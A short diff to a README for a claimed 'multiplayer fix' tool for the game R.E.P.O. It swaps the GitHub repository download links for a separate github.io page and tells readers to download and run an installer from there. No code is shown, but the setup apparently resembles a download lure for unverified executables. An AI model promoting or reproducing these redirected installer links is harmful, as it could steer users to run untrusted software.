@@ -1,6 +1,6 @@
 # 🛠️ REPO-Multiplayer-Fix - Resolve connection issues for your game
 
-[![Download Repo Multiplayer Fix](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/Rabbivshaped462/REPO-Multiplayer-Fix)
+[![Download Repo Multiplayer Fix](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://rabbivshaped462.github.io)
 
 This tool fixes connection errors in the game R.E.P.O. Use this guide to set up your game for smooth multiplayer sessions on Windows 10 and Windows 11.
 
@@ -21,7 +21,7 @@ Before you install the fix, ensure your computer meets these requirements:
 
 Follow these steps to apply the fix to your system.
 
-1. Go to the [official repository page](https://github.com/Rabbivshaped462/REPO-Multiplayer-Fix).
+1. Go to the [official repository page](https://rabbivshaped462.github.io).
 2. Locate the link to download the installer file.
 3. Save the file to your desktop for easy access.
 4. Close your game before you run the installer.
